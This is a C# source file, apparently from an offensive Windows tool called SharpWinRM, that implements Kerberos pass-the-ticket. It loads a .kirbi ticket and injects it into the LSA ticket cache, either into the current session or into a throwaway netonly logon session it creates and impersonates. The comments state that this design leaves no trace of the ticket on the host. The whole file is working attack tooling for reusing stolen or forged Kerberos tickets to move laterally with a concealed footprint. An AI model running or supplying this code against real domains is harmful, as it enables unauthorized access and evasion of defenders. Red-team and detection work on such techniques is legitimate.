using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace SharpWinRM
{
    /// <summary>
    /// Imports a Kerberos ticket (kirbi) into a logon session via
    /// LsaCallAuthenticationPackage KerbSubmitTicketMessage.
    /// Accepts a base64-encoded kirbi string or a path to a .kirbi file.
    /// </summary>
    internal static class KerberosTicket
    {
        // ── LSA ────────────────────────────────────────────────────────────

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern uint LsaConnectUntrusted(out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern uint LsaLookupAuthenticationPackage(
            IntPtr LsaHandle, ref LSA_STRING PackageName, out uint AuthPackage);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern uint LsaCallAuthenticationPackage(
            IntPtr LsaHandle, uint AuthPackage,
            IntPtr ProtocolSubmitBuffer, uint SubmitBufferLength,
            out IntPtr ProtocolReturnBuffer, out uint ReturnBufferLength,
            out uint ProtocolStatus);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern uint LsaFreeReturnBuffer(IntPtr Buffer);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern uint LsaDeregisterLogonProcess(IntPtr LsaHandle);

        [StructLayout(LayoutKind.Sequential)]
        private struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        // ── Process / token ────────────────────────────────────────────────

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool LogonUser(
            string lpszUsername, string lpszDomain, string lpszPassword,
            int dwLogonType, int dwLogonProvider, out IntPtr phToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(
            IntPtr hExistingToken, uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            int ImpersonationLevel,   // 2 = SecurityImpersonation
            int TokenType,            // 1 = TokenImpersonation
            out IntPtr phNewToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr handle);

        private const int  LOGON32_LOGON_NEW_CREDENTIALS = 9;
        private const int  LOGON32_PROVIDER_WINNT50      = 3;
        private const uint TOKEN_QUERY                   = 0x0008;
        private const uint TOKEN_DUPLICATE               = 0x0002;
        private const uint TOKEN_IMPERSONATE             = 0x0004;

        // ── KERB_SUBMIT_TKT_REQUEST offsets ────────────────────────────────
        //   MessageType  (4)   offset  0
        //   LogonId LUID (8)   offset  4
        //   Flags        (4)   offset 12
        //   Key KCK32   (12)   offset 16  (KeyType + Length + Offset, 4 bytes each)
        //   KerbCredSize (4)   offset 28
        //   KerbCredOff  (4)   offset 32
        //   [kirbi data]       offset 36
        private const uint KerbSubmitTicketMessage = 21;
        private const int  SubmitTktHeaderSize     = 36;

        // ── Public API ─────────────────────────────────────────────────────

        /// <summary>
        /// Import ticket directly into the current logon session (PTT-style, modifies your session).
        /// </summary>
        internal static void Import(string ticketArg)
        {
            ImportBytes(LoadKirbi(ticketArg));
        }

        /// <summary>
        /// Spawn an isolated dummy logon session, import the ticket there,
        /// and return a SacrificialSession that keeps the impersonation alive.
        /// Dispose it when the WinRM call is done — ticket and session vanish with it.
        /// </summary>
        internal static SacrificialSession CreateAndImport(string ticketArg)
        {
            byte[] kirbi = LoadKirbi(ticketArg);

            // 1. LogonUser type 9 (NewCredentials / netonly) — creates an isolated logon session
            //    with a fresh LUID in the current process, no child process spawned.
            //    Credentials are arbitrary; type 9 never validates them against a DC.
            if (!LogonUser("user", "domain", "pass",
                    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
                    out IntPtr hToken))
                throw new Exception("LogonUser (type 9) failed: " + Marshal.GetLastWin32Error());

            IntPtr hImpToken = IntPtr.Zero;
            try
            {
                // 2. Duplicate to an impersonation token (LogonUser returns a primary token)
                if (!DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE,
                        IntPtr.Zero, 2 /*SecurityImpersonation*/, 2 /*TokenImpersonation*/,
                        out hImpToken))
                    throw new Exception("DuplicateTokenEx failed: " + Marshal.GetLastWin32Error());

                // 3. Impersonate — thread now runs as the new isolated logon session
                var impCtx = new WindowsIdentity(hImpToken).Impersonate();

                // 4. Import ticket — LUID={0,0} resolves to the impersonated session, not ours
                try   { ImportBytes(kirbi); }
                catch { impCtx.Undo(); throw; }

                return new SacrificialSession(hToken, hImpToken, impCtx);
            }
            catch
            {
                if (hImpToken != IntPtr.Zero) CloseHandle(hImpToken);
                CloseHandle(hToken);
                throw;
            }
        }

        // ── Internals ──────────────────────────────────────────────────────

        private static void ImportBytes(byte[] kirbiBytes)
        {
            uint status = LsaConnectUntrusted(out IntPtr lsaHandle);
            if (status != 0)
                throw new Exception("LsaConnectUntrusted failed: 0x" + status.ToString("X8"));
            try
            {
                byte[] pkgBytes = Encoding.ASCII.GetBytes("Kerberos");
                IntPtr pkgPtr   = Marshal.AllocHGlobal(pkgBytes.Length);
                Marshal.Copy(pkgBytes, 0, pkgPtr, pkgBytes.Length);

                var lsaStr = new LSA_STRING
                {
                    Length        = (ushort)pkgBytes.Length,
                    MaximumLength = (ushort)(pkgBytes.Length + 1),
                    Buffer        = pkgPtr
                };
                status = LsaLookupAuthenticationPackage(lsaHandle, ref lsaStr, out uint kerbPkg);
                Marshal.FreeHGlobal(pkgPtr);
                if (status != 0)
                    throw new Exception("LsaLookupAuthenticationPackage failed: 0x" + status.ToString("X8"));

                int    total  = SubmitTktHeaderSize + kirbiBytes.Length;
                IntPtr reqPtr = Marshal.AllocHGlobal(total);
                try
                {
                    for (int i = 0; i < SubmitTktHeaderSize; i++)
                        Marshal.WriteByte(reqPtr, i, 0);

                    Marshal.WriteInt32(reqPtr,  0, (int)KerbSubmitTicketMessage);
                    Marshal.WriteInt64(reqPtr,  4, 0);   // LogonId = {0,0} = current session
                    Marshal.WriteInt32(reqPtr, 12, 0);   // Flags
                    // Key (12 bytes at 16) stays zeroed
                    Marshal.WriteInt32(reqPtr, 28, kirbiBytes.Length);
                    Marshal.WriteInt32(reqPtr, 32, SubmitTktHeaderSize);
                    Marshal.Copy(kirbiBytes, 0, IntPtr.Add(reqPtr, SubmitTktHeaderSize), kirbiBytes.Length);

                    status = LsaCallAuthenticationPackage(
                        lsaHandle, kerbPkg, reqPtr, (uint)total,
                        out IntPtr retBuf, out _, out uint protoStatus);

                    if (retBuf != IntPtr.Zero) LsaFreeReturnBuffer(retBuf);
                    if (status     != 0) throw new Exception("LsaCallAuthenticationPackage failed: 0x" + status.ToString("X8"));
                    if (protoStatus != 0) throw new Exception("KerbSubmitTicket protocol error: 0x" + protoStatus.ToString("X8"));
                }
                finally { Marshal.FreeHGlobal(reqPtr); }
            }
            finally { LsaDeregisterLogonProcess(lsaHandle); }
        }

        private static byte[] LoadKirbi(string arg)
        {
            if (string.IsNullOrEmpty(arg))
                throw new Exception("No ticket provided.");
            if (File.Exists(arg))
                return File.ReadAllBytes(arg);
            string b64 = arg.Replace(" ", "").Replace("\r", "").Replace("\n", "");
            try   { return Convert.FromBase64String(b64); }
            catch { throw new Exception("Could not load ticket — not a valid file path or base64 string."); }
        }
    }

    // ── SacrificialSession ─────────────────────────────────────────────────

    /// <summary>
    /// Keeps the impersonation of an isolated netonly logon session alive.
    /// Dispose to revert impersonation and kill the dummy process,
    /// removing all trace of the ticket from the host.
    /// </summary>
    internal sealed class SacrificialSession : IDisposable
    {
        private readonly IntPtr _hToken, _hImpToken;
        private readonly WindowsImpersonationContext _impCtx;

        internal SacrificialSession(IntPtr hToken, IntPtr hImpToken,
            WindowsImpersonationContext impCtx)
        {
            _hToken    = hToken;
            _hImpToken = hImpToken;
            _impCtx    = impCtx;
        }

        [DllImport("kernel32.dll")] private static extern bool CloseHandle(IntPtr h);

        public void Dispose()
        {
            try { _impCtx?.Undo(); } catch { }
            if (_hImpToken != IntPtr.Zero) CloseHandle(_hImpToken);
            if (_hToken    != IntPtr.Zero) CloseHandle(_hToken);
            // Closing the last handle to the logon session token causes Windows
            // to tear down the session and purge its Kerberos ticket cache.
        }
    }
}
